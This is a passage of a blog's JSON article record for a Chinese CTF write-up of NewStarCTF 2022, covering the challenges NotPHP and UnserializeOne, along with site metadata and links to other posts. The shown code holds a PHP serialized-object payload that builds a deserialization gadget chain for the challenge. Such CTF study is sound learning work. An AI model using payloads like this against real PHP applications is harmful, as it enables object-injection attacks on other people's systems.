class=\"hljs-number\">3</span>:<span class=\"hljs-string\">&quot;var&quot;</span>;O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">&quot;eeee&quot;</span>:<span class=\"hljs-number\">1</span>:&#123;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">&quot;obj&quot;</span>;r:<span class=\"hljs-number\">1</span>;&#125;&#125;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">&quot;func&quot;</span>;r:<span class=\"hljs-number\">2</span>;&#125;<br><br><span class=\"hljs-comment\">//O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;r:1;&#125;s:4:&quot;func&quot;;r:3;&#125;&#125;</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/2022NewStarCTF/image-20221027162117156.png\" alt=\"image-20221027162117156\"></p>\n<hr>\n<h1 id><a href=\"#\" class=\"headerlink\" title></a></h1>","text":"没啥简介 NewStarCTF2022公开赛虽然是别人学校的新生赛，难度不是很高，但是还是有许多值得学习的知识点 1.NotPHP123456789101112...","permalink":"/post/2022NewStarCTF","photos":[],"count_time":{"symbolsCount":"6k","symbolsTime":"5 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#NewStarCTF2022%E5%85%AC%E5%BC%80%E8%B5%9B\"><span class=\"toc-text\">NewStarCTF2022公开赛</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-NotPHP\"><span class=\"toc-text\">1.NotPHP</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-UnserializeOne\"><span class=\"toc-text\">2.UnserializeOne</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\"><span class=\"toc-text\"></span></a></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Sekai CTF 2022","uid":"ba0cf5d51c9ce53698d64b464314f97e","slug":"2022SekaiCTF","date":"2023-02-13T15:13:06.374Z","updated":"2023-08-06T08:02:12.273Z","comments":true,"path":"api/articles/2022SekaiCTF.json","keywords":null,"cover":"/img/42.jpg","text":"国外比赛难度确实逆天 Sekai CTF 2022https://github.com/project-sekai-ctf/sekaictf-2022 这是官方...","permalink":"/post/2022SekaiCTF","photos":[],"count_time":{"symbolsCount":"9.3k","symbolsTime":"8 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"htbのMachines","uid":"4497d51e9ba49087760c38d70069b58c","slug":"htb(Machines)","date":"2023-02-13T14:10:53.464Z","updated":"2023-08-06T07:53:48.898Z","comments":true,"path":"api/articles/htb(Machines).json","keywords":null,"cover":"/img/10.jpg","text":"Machines Machines【WEB】Stocker[easy]个人感觉新东西太多，难度对于开始可能中上 请先了解学习 NoSQL注入 api利用 通过i...","permalink":"/post/htb(Machines)","photos":[],"count_time":{"symbolsCount":112,"symbolsTime":"1 mins."},"categories":[{"name":"Hack the Box","slug":"Hack-the-Box","count":2,"path":"api/categories/Hack-the-Box.json"}],"tags":[{"name":"htb","slug":"htb","count":2,"path":"api/tags/htb.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}